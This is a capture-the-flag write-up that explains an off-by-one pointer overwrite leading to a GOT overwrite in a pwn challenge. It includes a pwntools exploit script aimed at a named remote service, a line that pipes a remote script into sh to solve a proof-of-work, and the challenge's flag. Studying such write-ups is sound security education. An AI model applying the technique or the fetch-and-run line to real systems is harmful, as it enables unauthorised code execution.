# Boundaryless CTF Challenge Writeup

## Challenge Information

- **Challenge Name**: Boundaryless
- **Category**: Pwn (Binary Exploitation)
- **Flag**: `FYPCTF26{g0t_by1e_fl1p_b3f0r3_4nd_4ft3r}`

---

## Summary

This challenge features an **off-by-one vulnerability** in the `handle_name()` function that allows partial pointer overwrite. By exploiting this, we can redirect a pointer from the Global Offset Table (GOT) to an arbitrary location, enabling us to overwrite `exit@GOT` with the address of a `win()` function that reads and prints the flag.

---

## Initial Analysis

### Binary Protections

```
$ checksec --file=boundaryless
[*] '/boundaryless'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

Key observations:
- **No PIE**: Binary is loaded at fixed addresses (0x400000), making exploitation easier
- **Partial RELRO**: GOT is writable, allowing GOT overwrite attacks
- **NX enabled**: Stack is not executable, preventing shellcode injection
- **No canary**: Stack canaries are not present (though not relevant for this exploit)

### Key Addresses

| Symbol | Address |
|--------|---------|
| `win()` | `0x401263` |
| `exit@GOT` | `0x404080` |
| `g_cfg` (BSS) | `0x4040d0` |

---

## Vulnerability Analysis

### The Data Structure

```c
typedef struct {
    uint8_t name[16];
    uint8_t *target;
} config_t;

static config_t g_cfg;
```

The `config_t` structure contains:
1. A 16-byte name buffer
2. A pointer `target` immediately following it

Memory layout of `g_cfg` at `0x4040d0`:
```
0x4040d0: name[0]  name[1]  ... name[15]  (16 bytes)
0x4040e0: target[0] target[1] ... target[7]  (8 bytes, pointer)
```

### The Vulnerability

In `handle_name()` (chal.c, line 105):

```c
static int handle_name(const char *line) {
    long idx = 0;
    uint8_t val = 0;

    if (!parse_assignment(line, "name", &idx, &val)) {
        return 0;
    }

    if (idx <= (long)sizeof(g_cfg.name)) {   // BUG: should be idx < sizeof(...)
        g_cfg.name[idx] = val;               // Off-by-one allows write to name[16]
        puts("ok");
    } else {
        puts("idx too large");
    }
    return 1;
}
```

**The bug**: The condition `idx <= sizeof(g_cfg.name)` (which is `idx <= 16`) allows writing to `name[16]`. Since `name` is only 16 bytes (indices 0-15), writing to index 16 overflows into the adjacent `target` pointer.

This is a classic **off-by-one (OBO)** vulnerability that enables partial pointer overwrite.

---

## Exploitation Strategy

### Initial State

In `main()`, the `target` pointer is initialized:

```c
g_cfg.target = (uint8_t *)((uintptr_t)get_exit_gotplt() ^ 1ULL);
```

This returns `exit@GOT ^ 1`:
- `exit@GOT` = `0x404080`
- `target` = `0x404080 ^ 1` = `0x404081`

### The Goal

When the user sends the `run` command, the program executes:
```c
exit(0);  // Calls exit@PLT which jumps to exit@GOT
```

We want to redirect `exit@GOT` to point to `win()` (`0x401263`) instead of the real `exit()`.

### Exploitation Steps

#### Step 1: Partial Pointer Overwrite via Off-by-One

The `byte[]` write command uses `g_cfg.target` as the base address:

```c
if (idx < 8) {
    g_cfg.target[idx] = val;  // Write val to (target + idx)
}
```

To overwrite `exit@GOT` (at `0x404080`), we need `target + 6` and `target + 7` to point to the bytes of `exit@GOT`:
- `target + 6 = 0x404080` → `target = 0x40407a`

Currently, `target = 0x404081`. We need to change its LSB from `0x81` to `0x7a`.

Since `name[16]` overlaps with the LSB of `target`, we can write:
```
name[16] = 0x7a
```

This changes `target` from `0x404081` to `0x40407a`.

#### Step 2: GOT Overwrite via byte[] Commands

Now that `target = 0x40407a`:
- `target[6] = 0x404080` (exit@GOT low byte)
- `target[7] = 0x404081` (exit@GOT high byte)

We need to write `win()` address `0x401263`:
- Low byte: `0x63`
- High byte: `0x12`

Commands:
```
byte[6]=63   # Writes 0x63 to 0x404080
byte[7]=12   # Writes 0x12 to 0x404081
```

#### Step 3: Trigger the Exploit

Sending `run` executes `exit(0)`, which:
1. Jumps to `exit@PLT`
2. Looks up `exit@GOT` → now contains `0x401263` (win)
3. Executes `win()` which reads and prints the flag

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
import re

# Addresses
WIN_ADDR = 0x401263    # win() function address
EXIT_GOT = 0x404080    # exit@GOT address

def exploit(remote_host, remote_port):
    p = remote(remote_host, remote_port)
    
    # Handle PoW (proof of work) if present
    line = p.recvline(timeout=3).decode()
    if "proof of work" in line.lower():
        curl_line = p.recvline(timeout=2).decode()
        # Solve PoW using pwn.red service
        match = re.search(r"sh -s (s\.[^\s]+)", curl_line)
        if match:
            challenge = match.group(1)
            cmd = f"curl -sSfL https://pwn.red/pow | sh -s {challenge}"
            solution = subprocess.run(cmd, shell=True, capture_output=True, 
                                     text=True, timeout=30).stdout.strip()
            p.sendline(solution.encode())
            time.sleep(1)
    
    # Receive initial banner
    p.recvuntil(b"cfg>")
    
    # Step 1: Off-by-one overwrite of target pointer LSB
    # Change target from 0x404081 to 0x40407a
    new_lsb = 0x7a
    p.sendline(f"name[16]={new_lsb:02x}".encode())
    p.recvuntil(b"cfg>")
    log.info(f"Set name[16] = 0x{new_lsb:02x}")
    
    # Step 2: Overwrite exit@GOT with win() address
    # win() = 0x401263 → bytes: 0x63, 0x12
    p.sendline(f"byte[6]={WIN_ADDR & 0xFF:02x}".encode())  # 0x63
    p.recvuntil(b"cfg>")
    
    p.sendline(f"byte[7]={(WIN_ADDR >> 8) & 0xFF:02x}".encode())  # 0x12
    p.recvuntil(b"cfg>")
    
    log.info("Overwrote exit@GOT with win() address")
    
    # Step 3: Trigger the exploit
    p.sendline(b"run")
    
    # Receive and extract flag
    result = p.recvall(timeout=3).decode(errors="ignore")
    flag_match = re.search(r"FYPCTF26\{[^}]+\}", result)
    if flag_match:
        flag = flag_match.group(0)
        log.success(f"FLAG: {flag}")
        return flag
    
    return None

if __name__ == "__main__":
    context.log_level = "info"
    flag = exploit("challenge.hacktheflag.one", 30028)
    print(f"\n[+] RESULT: {flag}")
```

---

## Exploit Walkthrough

### Step-by-Step Execution

1. **Initial connection**: Connect to remote service and solve PoW challenge

2. **Partial pointer overwrite**:
   ```
   cfg> name[16]=7a
   ok
   ```
   - Writes `0x7a` to `name[16]` (index 16 is allowed due to off-by-one)
   - Overflows into `target` pointer, changing it from `0x404081` to `0x40407a`

3. **GOT overwrite**:
   ```
   cfg> byte[6]=63
   ok
   cfg> byte[7]=12
   ok
   ```
   - `target[6]` = `0x40407a + 6` = `0x404080` (exit@GOT)
   - `target[7]` = `0x40407a + 7` = `0x404081` (exit@GOT + 1)
   - Writes `0x63` and `0x12` to overwrite exit@GOT with `0x401263` (win)

4. **Trigger**:
   ```
   cfg> run
   Applying config...
   FYPCTF26{g0t_by1e_fl1p_b3f0r3_4nd_4ft3r}
   ```
   - `exit(0)` jumps to `win()` instead of real exit
   - `win()` opens `./flag.txt` and prints the flag

---

## Why This Works

### The Memory Layout

```
Before exploit:
  g_cfg.name[0-15]   = 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
                       0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
  g_cfg.target       = 0x81 0x40 0x40 0x00 0x00 0x00 0x00 0x00  (0x404081)

After name[16]=0x7a:
  g_cfg.name[0-15]   = 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
                       0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
  g_cfg.target       = 0x7a 0x40 0x40 0x00 0x00 0x00 0x00 0x00  (0x40407a)

After byte writes:
  exit@GOT (0x404080) = 0x63 0x12 0x40 0x00 0x00 0x00 0x00 0x00  (0x401263)
```

### Key Insight

The XOR with 1 in `get_exit_gotplt()` is a red herring meant to obscure the actual GOT address. By using partial pointer overwrite, we don't need to know the exact address - we just need to flip one byte.

The vulnerability allows us to:
1. **Before**: Corrupt the `target` pointer to point where we want
2. **After**: Use the corrupted `target` to write arbitrary bytes (GOT overwrite)

This is reflected in the flag: `g0t_by1e_fl1p_b3f0r3_4nd_4ft3r` (GOT byte flip before and after).

---

## Mitigations

To prevent this vulnerability:

1. **Fix the off-by-one**: Change `idx <= sizeof(g_cfg.name)` to `idx < sizeof(g_cfg.name)`

2. **Full RELRO**: Enable Full RELRO to make GOT read-only after relocation

3. **Pointer obfuscation**: Use stronger pointer obfuscation than simple XOR

4. **Type safety**: Use array bounds checking or safer languages

---

## Conclusion

This challenge demonstrates how a seemingly minor off-by-one error can lead to arbitrary code execution through:
- Partial pointer overwrite to control memory write destination
- GOT overwrite to hijack control flow
- Redirecting program execution to a win function

The flag `FYPCTF26{g0t_by1e_fl1p_b3f0r3_4nd_4ft3r}` perfectly captures the essence of the exploit: a GOT overwrite via byte flipping, achieved through the "before" (off-by-one overwrite) and "after" (GOT write) phases.
